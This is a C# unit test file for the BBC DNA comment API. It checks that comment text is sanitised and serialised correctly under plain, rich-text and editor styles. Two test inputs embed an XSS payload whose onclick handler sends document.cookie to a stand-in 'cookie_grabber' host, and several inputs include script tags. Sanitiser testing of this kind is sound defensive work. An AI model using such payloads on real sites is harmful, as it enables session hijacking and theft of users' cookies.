using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Web;
using System.Xml;
using BBC.Dna.Utils;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using BBC.Dna.Moderation.Utils;
using System.Text;
using System.IO;

namespace BBC.Dna.Api.Tests
{
    /// <summary>
    ///This is a test class for CommentInfoTest and is intended
    ///to contain all CommentInfoTest Unit Tests
    ///</summary>
    [TestClass]
    public class CommentInfoTest
    {
        private List<string[]> testDataPlainText;
        private List<string[]> testDataRichText;
        private List<string[]> testDataRichTextEditor;
        private List<string[]> testDataOther;
        public CommentInfoTest()
        {
            testDataPlainText = new List<string[]>();
            testDataPlainText.Add(new[] { "test", "test" });
            testDataPlainText.Add(new[] { "<b>test</b>", "test" });
            testDataPlainText.Add(new[] { "<script>test</script>", "test" });
            testDataPlainText.Add(new[] { "test\r\nnewline", "test<BR />newline" });
            testDataPlainText.Add(new[] { "<a href=\"testurl\">test</a>", "test" });
            testDataPlainText.Add(new[] { "another test http://www.bbc.co.uk/ url", "another test <a href=\"http://www.bbc.co.uk/\">http://www.bbc.co.uk/</a> url" });
            testDataPlainText.Add(new[] { @"123

http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf\">http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf</a>" });

            testDataRichText = new List<string[]>();
            testDataRichText.Add(new[] { "test", "test" });
            testDataRichText.Add(new[] { "<b>test</b>", "<b>test</b>" });
            testDataRichText.Add(new[] { "test\r\nnewline", "test<BR />newline" });
            testDataRichText.Add(new[] { "<script>test</script>", "" });
            testDataRichText.Add(new[] { "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags.", "this is a <p>test</p> for bad html tags." });
            

            testDataOther = new List<string[]>();
            testDataOther.Add(new[] { "test", "test" });
            testDataOther.Add(new[] { "<b>test</b>", "<b>test</b>" });
            testDataOther.Add(new[] { "test\r\nnewline", "test\r\nnewline" });
            testDataOther.Add(new[] { "<script>test</script>", "<script>test</script>" });

            testDataRichTextEditor = new List<string[]>();
            testDataRichTextEditor.Add(new[] { "test", "test" });
            testDataRichTextEditor.Add(new[] { "<b>test</b>", "<b>test</b>" });
            testDataRichTextEditor.Add(new[] { "test\r\nnewline", "test<BR />newline" });
            testDataRichTextEditor.Add(new[] { "<script>test</script>", "<script>test</script>" });
            testDataRichTextEditor.Add(new[] { "<a href=\"http://www.bbc.co.uk/testurl\">test</a>", "<a href=\"http://www.bbc.co.uk/testurl\">test</a>" });
            testDataRichTextEditor.Add(new[] { "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags.", "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags." });
            
        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_XmlSerialisingPlainText_ReturnsValidObject()
        {

            foreach (var data in testDataPlainText)
            {
                TestTextXmlSerialisation(PostStyle.Style.plaintext, data[1], data[0], false);
            }
            
        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_XmlSerialisingRichText_ReturnsValidObject()
        {


            foreach (var data in testDataRichText)
            {
                TestTextXmlSerialisation(PostStyle.Style.richtext, data[1], data[0], false);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_XmlSerialisingRichTextAsEditor_ReturnsValidObject()
        {
            foreach (var data in testDataRichTextEditor)
            {
                TestTextXmlSerialisation(PostStyle.Style.richtext, data[1], data[0], true);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_XmlSerialisingRawTextUnknown_ReturnsValidObject()
        {
            foreach (var data in testDataOther)
            {
                TestTextXmlSerialisation(PostStyle.Style.rawtext, data[1], data[0], false);
                TestTextXmlSerialisation(PostStyle.Style.unknown, data[1], data[0], false);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_JsonSerialisingPlainText_ReturnsValidObject()
        {
            foreach (var data in testDataPlainText)
            {
                TestTextJsonSerialisation(PostStyle.Style.plaintext, data[1], data[0], false);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_JsonSerialisingRichText_ReturnsValidObject()
        {
            foreach (var data in testDataRichText)
            {
                TestTextJsonSerialisation(PostStyle.Style.richtext, data[1], data[0], false);
            }

        }

        /// <summary>
        ///A test for CommentInfo Constructor
        ///</summary>
        [TestMethod]
        public void CommentInfo_JsonSerialisingOther_ReturnsValidObject()
        {
            foreach (var data in testDataOther)
            {
                TestTextJsonSerialisation(PostStyle.Style.unknown, data[1], data[0], false);
                TestTextJsonSerialisation(PostStyle.Style.rawtext, data[1], data[0], false);
            }

        }

        private void TestTextXmlSerialisation(PostStyle.Style style, string expected, string input, bool isEditor)
        {
            var target = new CommentInfo
            {
                PostStyle = style,
                text = CommentInfo.FormatComment(input, style, CommentStatus.Hidden.NotHidden, isEditor)
            };
            var docExpected = new XmlDocument();
            docExpected.Load(StringUtils.SerializeToXml(expected));
            expected = docExpected.DocumentElement.InnerXml;

            var doc = new XmlDocument();
            doc.Load(target.ToXml());
            Assert.AreEqual(expected, doc.DocumentElement["text"].InnerXml);
        }

        private void TestTextJsonSerialisation(PostStyle.Style style, string expected, string input, bool isEditor)
        {
            var target = new CommentInfo()
            {
                PostStyle = style,
                text = CommentInfo.FormatComment(input, style, CommentStatus.Hidden.NotHidden, isEditor)
            };

            MemoryStream stream = (MemoryStream)StringUtils.SerializeToJson(target);
            var doc = Encoding.UTF8.GetString(stream.ToArray());

            var returnedObject = (CommentInfo)StringUtils.DeserializeJSONObject(doc, target.GetType());
            Assert.AreEqual(expected, returnedObject.text);
            //var regText = new Regex("\"text\"\\:\"(.*)\",");
            //Assert.IsTrue(regText.IsMatch(doc));
            //MatchCollection matches = regText.Matches(doc);
            //foreach (Match match in matches)
            //{
            //    var actual = match.Value.Substring(8, match.Value.Length - 10);
            //    actual = actual.Replace("\\/", "/");
            //    actual = actual.Replace("/\\", "/");
            //    Assert.AreEqual(expected, actual);
            //}
            
        }
    }
}